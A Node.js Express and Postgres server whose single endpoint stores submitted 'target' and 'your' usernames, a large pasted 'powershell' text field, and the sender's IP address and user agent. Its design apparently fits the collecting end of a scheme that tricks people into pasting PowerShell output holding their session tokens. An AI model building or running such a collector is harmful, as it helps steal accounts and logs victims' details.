const express = require("express");
const { Pool } = require("pg");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: "5mb" }));
app.use(express.static("public"));

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: process.env.NODE_ENV === "production" ? { rejectUnauthorized: false } : false
});

async function createTableIfNotExists() {
    await pool.query(`
        CREATE TABLE IF NOT EXISTS submissions (
            id              SERIAL PRIMARY KEY,
            target_username TEXT NOT NULL,
            your_username   TEXT NOT NULL,
            powershell      TEXT NOT NULL,
            created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            ip_address      INET,
            user_agent      TEXT
        );
    `);

    // indeksy
    await pool.query(`
        CREATE INDEX IF NOT EXISTS idx_submissions_created_at 
        ON submissions (created_at DESC);
    `);
    await pool.query(`
        CREATE INDEX IF NOT EXISTS idx_submissions_target 
        ON submissions (target_username);
    `);
}

async function start() {
    try {
        await pool.query("SELECT 1");
        console.log("Połączono z Postgres!");
        await createTableIfNotExists();
        console.log("Tabela 'submissions' gotowa.");

        app.post("/api/submit", async (req, res) => {
            try {
                const { targetUsername, yourUsername, powershell } = req.body;

                if (!targetUsername?.trim() || !yourUsername?.trim() || !powershell?.trim()) {
                    return res.status(400).json({
                        error: "Wszystkie pola są wymagane."
                    });
                }

                // limit długości (ochrona przed zbyt dużymi payloadami)
                if (powershell.length > 500_000) {
                    return res.status(400).json({
                        error: "Zbyt duża zawartość pola powershell."
                    });
                }

                const ip = req.headers["x-forwarded-for"]?.split(",")[0]?.trim() 
                           || req.socket.remoteAddress 
                           || null;

                const result = await pool.query(
                    `INSERT INTO submissions 
                        (target_username, your_username, powershell, ip_address, user_agent)
                     VALUES ($1, $2, $3, $4, $5)
                     RETURNING id, created_at`,
                    [
                        targetUsername.trim(),
                        yourUsername.trim(),
                        powershell,
                        ip,
                        req.headers["user-agent"] || null
                    ]
                );

                res.json({
                    success: true,
                    id: result.rows[0].id,
                    created_at: result.rows[0].created_at
                });
            } catch (error) {
                console.error("Błąd zapisu:", error);
                res.status(500).json({
                    error: "Nie udało się zapisać danych."
                });
            }
        });

        // opcjonalny endpoint do podglądu (tylko do testów / admin)
        // app.get("/api/submissions", async (req, res) => { ... });

        app.listen(PORT, () => {
            console.log(`Serwer działa na porcie ${PORT}`);
        });
    } catch (error) {
        console.error("Błąd połączenia z Postgres:", error);
        process.exit(1);
    }
}

start();
